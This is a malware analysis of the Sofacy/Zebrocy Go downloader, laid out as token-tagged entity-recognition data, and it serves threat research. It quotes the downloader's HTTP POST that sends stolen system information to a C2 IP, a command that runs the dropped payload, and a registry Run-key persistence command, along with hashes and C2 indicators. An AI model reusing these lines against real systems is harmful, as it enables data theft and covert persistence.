A Zebrocy Go Downloader Release_Time :  2019-01-11 Report_URL :  https://securelist.com/a-zebrocy-go-downloader/89419/ Last year at SAS2018 in Cancun , Mexico , “ Masha and these Bears ” included discussion of a subset of Sofacy activity and malware that we call “ Zebrocy ” , and predictions for the decline of SPLM/XAgent Sofacy activity coinciding with the acceleration of Zebrocy activity and innovation .		others others others others others others others others others others others others others others others others others location others location others others security_team security_team security_team security_team others others others others others others others attack_activity attack_activity others others others others others others malware others others others others others others others others others attack_activity attack_activity others others others others others malware others others others others
Zebrocy was initially introduced as a Sofacy backdoor package in 2015 , but the Zebrocy cluster has carved a new approach to malware development and delivery to the world of Sofacy .		malware others others others others others vul_aliases vul_aliases others others time others others others malware others others others others others others others others others others others others others others others others others
In line with this approach , we will present more on this Zebrocy innovation and activity playing out at SAS 2019 in Singapore .		others others others others others others reference_word others others others others others malware others others others others others others others time others location others
Our colleagues at Palo Alto recently posted an analysis of Zebrocy malware .		others others others security_team security_team others others others others others malware others others
The analysis is good and marked their first detection of a Zebrocy Go variant as October 11 , 2018 .		others others others others others others others others others others others malware others others others time time time time others
Because there is much to this cluster , clarifying and adding to the discussion is always productive .		others others others others others others others others others others others others others others others others others others
Our original “ Zebrocy Innovates – Layered Spearphishing Attachments and Go Downloaders ” June 2018 writeup documents the very same downloader , putting the initial deployment of Zebrocy Go downloader activity at May 10 , 2018 .		others others others malware others others tool tool tool others tool tool others time time others others others others others others others others others others others others malware tool tool others others time time time time others
And while the targeting in the May event was most likely different from the October event , we documented this same Go downloader and same C2 was used to target a Kyrgyzstan organization .		others others others others others attack_activity time attack_activity others others others others others attack_activity time attack_activity others others others others others tool tool others others tool others others others others others location government others
Also interesting is that the exact same system was a previous Zebrocy target earlier in 2018 .		others others others others reference_word reference_word reference_word reference_word others others others malware others others others time others
So , knowing that this same activity is being reported on as “ new ” six months later tells us a bit about the willingness of this group to re-use rare components and infrastructure across different targets .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
While they are innovating with additional languages , as we predicted in early 2018 , their infrastructure and individual components may have more longevity than predicted .		others others others others others others others others others others others others others time others others others others others others others others others others others others others
Additionally , at the beginning of 2018 , we predicted the volume of Zebrocy activity and innovation will continue to increase , while the more traditional SPLM/XAgent activity will continue to decline .		others others others others others others time others others others others others others malware others others others others others others others others others others others others others others others others others others others
Reporting on SPLM/XAgent certainly has followed this course in 2018 as SPLM/XAgent detections wind down globally , as has Sofacy ’s use of this malware from our perspective .		others others others others others others others others others time others others others others others others others others others others others others others others reference_word reference_word others others others others
Much of the content below is reprinted from our June document .		others others others others others others others others others others others others
The Sofacy subset we identify as “ Zebrocy ” continues to target Central Asian government related organizations , both in-country and remote locations , along with a new middle eastern diplomatic target .		others others others others others others others malware others others others others target_crowd target_crowd target_crowd target_crowd target_crowd others others target_crowd others target_crowd target_crowd others others others others target_crowd target_crowd target_crowd target_crowd target_crowd others
And , as predicted , they continue to build out their malware set with a variety of scripts and managed code .		others others others others others reference_word others others others others others others others others others tool tool tool others tool tool others
In this case , we see new spearphishing components – an LNK file maintaining powershell scripts and a Go-implemented system information collector/downloader .		others others others others others others others malware malware others others tool tool tool tool tool others others tool tool tool tool others
This is the first time we have observed a well-known APT deploy malware with this compiled , open source language “ Go ” .		others others others others others others others others others others others others others others others others others others others others others program_language others others
There is much continued recent Zebrocy activity using their previously known malware set as well .		others others others others others malware others others others others others others others others others others
Starting in May 2018 , Zebrocy spearphished Central Asian government related targets directly with this new Go downloader .		others others time time others malware others target_crowd target_crowd target_crowd others others others others reference_word reference_word reference_word reference_word others
For example , the attachment name included one “ 30-144.arj ” compressed archive , an older archiver type handled by 7zip , Rar/WinRAR , and others .		others others others others tool others others others others sample_name others tool tool others others tool tool tool others others tool others others others others others others
Users found “ 30-144.exe ” inside the archive with an altered file icon made to look like the file was a Word document ( regardless of the .exe file extension ) .		others others others sample_name others others others others others others others others others others others others others others others others others tool tool others others others others others others others others others
And in a similar fashion in early June , Zebrocy spearphished over a half-dozen accounts targeting several Central Asian countries ’ diplomatic organizations with a similar scheme “ 2018-05-Invitation-Letter (1 ).rar//2018-05-Invitation-Letter (pril ).docx ” , sending out a more common Zebrocy Delphi downloader .		others others others others others others others time others malware others others others tool tool others others target_crowd target_crowd target_crowd others string string string string string string others sample_name sample_name sample_name sample_name others sample_name sample_name sample_name sample_name others others others others others others others malware others others others
In other cases , delivery of the new Go downloader was not straightforward .		others others others others others others others others others others others others others others
The new Go downloader also was delivered with a new spearphishing object that rolls up multiple layers of LNK file , powershell scripts , base64 encoded content , .docx files and the Go downloader files .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The downloader is an unusually large executable at over 1.5mb , written to disk and launched by a powershell script .		others others others others others others others others others others others others others others others others others others others others others
So the attachment that arrived over email was large .		others others others others others others others others others others
The powershell script reads the file ’s contents from a very large LNK file that was included as an email attachment , and then writes it to disk along with a Word document of the same name .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
So , launching the downloader is followed with the opening of an identically named decoy word document with “ WINWORD.EXE ” /n “ ***\30-276 (pril ).docx ” /o ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The downloader collects a large amount of system information and POSTs it to a known Zebrocy C2 , then pulls down known Zebrocy Delphi payload code , launches it , and deletes itself .		others others others others others others others others others others others others others others others malware others others others others others others malware others others others others others others others others others others others
We observed previous , somewhat similar spearphishing scenarios with an archive containing .LNK , .docx , and base64 encoded executable code , delivering offensive Finfisher objects in separate intrusion activity clusters .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This activity was not Sofacy , but the spearphishing techniques were somewhat similar – the layered powershell script attachment technique is not the same , but not altogether new .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
And , it is important to reiterate that these Central Asian government and diplomatic targets are often geolocated remotely .		others others others others others others others others others others others others others others others others others others others others
In the list of target geolocations , notice countries like South Korea , the Netherlands , etc .		others others others others others others others others others others others others others others others others others others
In addition to Zebrocy Go downloader data , this report provides data on various other observed Zebrocy malware and targets over the past three months .		others others others others others others others others others others others others others others others others malware others others others others others others others others others
Mostly all observed Zebrocy activity involves spearphishing .		others others others malware others others others others
Spearphish attachments arrive with .rar or .arj extensions .		others others others others others others others others others
Filename themes include official government correspondence invitations , embassy notes , and other relevant items of interest to diplomatic and government staff .		others others others others others others others others others others others others others others others others others others others others others others others
Enclosed objects may be LNK , docx , or exe files .		others others others others others others others others others others others others
A decoy PDF that directly targeted a Central Asian nation is included in one of the .arj attachments alongside the Go downloader .		others others others others others others others others others others others others others others others others others others others others others others others
The content is titled “ Possible joint projects in cooperation with the International Academy of Sciences ” and lists multiple potential projects requiring international cooperation with Tajikistan and other countries .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This document appears to be a legitimate one that was stolen , created mid-May 2018 .		others others others others others others others others others others others others others time time others
While we cannot reprint potentially leaked information publicly , clearly , the document was intended for a Russian-language reader .		others others others others others others others others others others others others others others others others others others others others others
The LNK containing two layers of powershell script and base64 encoded content is an unusual implementation – contents from a couple are listed at the technical appendix .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others
When opened , the script opens the shortcut file it is delivered within ( “ 30-276 (pril ).docx.lnk ” ) , pulls out the base64 encoded contents ( in one case , from byte 3507 to byte 6708744 ) , base64 decodes the content and another layer of the same powershell decoding .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This script writes two files to disk as “ 30-276 (pril ).exe ” and “ 30-276 (pril ).docx ” and opens both files , leading to the launch of the Go language system information collector/downloader and a decoy Word document .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Zebrocy Md5:333d2b9e99b36fb42f9e79a2833fad9c .		malware others others
Zebrocy Sha256:fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e .		malware others others sha2 others
Zebrocy Size : 1.79mb ( upx packed – 3.5mb upx unpacked ) .		malware others others others others others others others others others others others others
Zebrocy CompiledOn : Stomped ( Wed Dec 31 17:00:00 1969 ) .		malware others others others others others others others others others others others
Zebrocy Type : PE 32-bit Go executable .		malware others others others others others others others
Zebrocy Name : 30-276 (pril ).exe .		malware others others sample_name sample_name sample_name sample_name sample_name others
This new Go component not only downloads and executes another Zebrocy component , but it enumerates and collects a fair amount of system data for upload to its C2 , prior to downloading and executing any further modules .		others others others others others others others others others others malware others others others others others others others others others others others others others others others others others others others others others others others others others others others others
It simply collects data using the systeminfo utility , and in turn makes a variety of WMI calls .		others others others others others others others others others others others others others others others others others others others
After collecting system information , the backdoor calls out to POST to its hardcoded C2 , in this case a hardcoded IP/Url .		others others others others others others others others others others others others others others others others others others others others others others others
Note that the backdoor simply uses the default Go user-agent :   “POST /technet-support/library/online-service-description.php?id_name=345XXXD5 HTTP/1.1 Host : 89.37.226.148 User-Agent : Go-http-client/1.1 ”  With this POST , the module uploads all of the system information it just gathered with the exhaustive systeminfo utility over http : hostname , date/time , all hardware , hotfix , service and software information .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The module then retrieves the gzip ’d , better known Zebrocy dropper over port 80 as part of an encoded jpg file , writes it to disk , and executes from a command line :   “cmd /C c:\users\XXX\appdata\local\Identities\{83AXXXXX-986F-1673-091A-02XXXXXXXXXX}\w32srv.exe ”  and adds a run key persistence entry with the system utility reg.exe :  cmd /C “ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Driveupd /d c:\users\XXX\appdata\local\Identities\{83AXXXXX-986F-1673-091A-02XXXXXXXXXX}\w32srv.exe /f ”  Zebrocy Md5:3c58ed6913593671666283cb7315dec3 .		others others others others others others others others others others others malware others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others malware others others
Zebrocy Sha256:96c3700ad639faa85982047e05fbd71c3dfd502b09f9860685498124e7dbaa46 .		malware others others
Zebrocy Size : 478.5kb ( upx-packed ) .		malware others others others others others others others
Zebrocy Compiled : Fri Apr 27 06:40:32 2018 .		malware others others others others others others others others
Zebrocy Type : PE32 AutoIT executable .		malware others others others others others others
This AutoIT dropper writes out a Delphi payload , consistent with previous behavior going back to November 2015 , initially described in our January 2016 report “ Zebrocy – Sofacy APT Deploys New Delphi Payload ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others malware others others others others others others others others others
Zebrocy Md5:2f83acae57f040ac486eca5890649381 .		malware others others
Zebrocy Sha256:f9e96b2a453ff8922b1e858ca2d74156cb7ba5e04b3e936b77254619e6afa4e8 .		malware others others sha2 others
Zebrocy Size : 786kb .		malware others others others others
Zebrocy Compiled : Fri Jun 19 16:22:17 1992 ( stomped/altered ) .		malware others others others others others others others others others others others
Zebrocy Type : PE32 exe [v4.7.7] Path , Name   c:\ProgramData\Protection\Active\armpro.exe .		malware others others others others others others others others others others others others others others
Interestingly the final payload reverts back to an earlier version [v4.7.7] .		others others others others others others others others others others others others others others
A “ TURBO ” command is missing from this Zebrocy Delphi backdoor command list .		others others others others others others others others others malware others others others others others
Zebrocy backdoors are configured to directly communicate with IP assigned web server hosts over port 80 , and apparently the group favors Debian Linux for this part of infrastructure : Apache 2.4.10 running on Debian Linux .		malware others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
A somewhat sloppy approach continues , and the group set up and configured one of the sites with digital certificates using a typical Sofacy-sounding domain that they have not yet registered : “ weekpost.org ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Digital certificate details are provided in the appendix .		others others others others others others others others others
These “ fast setup ” VPS servers run in “ qhoster.com ” can be paid for with Webmoney , Bitcoin , Litecoin , Dash , Alfa Click , Qiwi , transfers from Sberbank Rossii , Svyaznoy , Promsvyazbank , and more .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Although , it appears that Bitcoin and Dash may be of the most interest to help ensure anonymous transactions .		others others others others others others others others others others others others others others others others others others others others
One of the VPS IP addresses ( 80.255.12.252 ) is hosted in the “ afterburst.com ” /Oxygem range .		others others others others others others others others others others others others others others others others others others others
This service is the odd one out and is unusual because it only supports VISA/major credit cards and Paypal at checkout .		others others others others others others others others others others others others others others others others others others others others others others
If other payment options are provided , they are not a part of the public interface .		others others others others others others others others others others others others others others others others others
Zebrocy Go downloader 2018 targets continue to be Central Asian government foreign policy and administrative related .		malware others others time others others others others others others others others others others others others others
Some of these organizations are geolocated in-country , or locally , and some are located remotely .		others others others others others others others others others others others others others others others others others
In several cases , these same systems have seen multiple artefacts from Zebrocy over the course of 2017 and early 2018: Kazakhstan Kyrgyzstan Azerbaijan Tajikistan .		others others others others others others others others others others others others malware others others others others others others others others others others others others others others
Additional recent Zebrocy target geo-locations ( targeting various Central Asian/ex-USSR local and remote government locations ) :  Qatar Ukraine Czech Republic Mongolia Jordan Germany Belgium Iran Turkey Armenia Afghanistan South Korea Turkmenistan Kazakhstan Netherlands Kuwait United Arab Emirates Spain Poland Qatar Oman Switzerland Mongolia Kyrgyzstan United Kingdom .		others others malware others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Zebrocy activity is a known subset of Sofacy activity .		malware others others others others others others others others others
We predicted that they would continue to innovate within their malware development after observing past behavior , developing with Delphi , AutoIT , .Net C# , Powershell , and now “ Go ” languages .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Their continued targeting , phishing techniques , infrastructure setup , technique and malware innovation , and previously known backdoors help provide strong confidence that this activity continues to be Zebrocy .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others malware others
Zebrocy continues to maintain a higher level of volume attacking local and remote ex-USSR republic Central Asian targets than other clusters of targeted Sofacy activity .		malware others others others others others others others others others others others others others others others others others others others others others others others others others
Also interesting with this Sofacy sub-group is the innovation that we continue to see within their malware development .		others others others others others others others others others others others others others others others others others others others
Much of the spearphishing remains thematically the same , but the remote locations of these Central Asian targets are becoming more spread out – South Korea , Netherlands , etc .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
While their focus has been on Windows users , it seems that we can expect the group to continue making more innovations within their malware set .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
Perhaps all their components will soon support all OS platforms that their targets may be using , including Linux and MacOS .		others others others others others others others others others others others others others others others others others others others others others others
Zebrocy spearphishing continues to be characteristically higher volume for a targeted attacker , and most likely that trend will continue .		malware others others others others others others others others others others others others others others others others others others others others
And , as their spearphishing techniques progress to rival Finfisher techniques without requiring zero-day exploitation , perhaps Zebrocy will expand their duplication of more sources of open source spearphishing techniques .		others others others others others others others others others others others others others others others others others malware others others others others others others others others others others others others others
Zebrocy Go downloader : 333d2b9e99b36fb42f9e79a2833fad9c .		malware others others others md5 others
Zebrocy IPs : 80.255.12.252 89.37.226.148 46.183.218.34 185.77.131.110 92.114.92.128 .		malware others others IP_evil IP_evil IP_evil IP_evil IP_evil others
Zebrocy URLs : /technet-support/library/online-service-description.php?id_name=XXXXX /software-apptication/help-support-apl/getidpolapl.php .		malware others others url_evil url_evil url_evil url_evil others
Zebrocy File – paths and names : 30-276 (pril ).exe 30-144- (copy ).exe Embassy Note No.259.docx.lnk 2018-05-Invitation-Letter (1 ).rar//2018-05-Invitation-Letter (pril ).docx .		malware others others others others others others sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name sample_name others sample_name sample_name sample_name sample_name others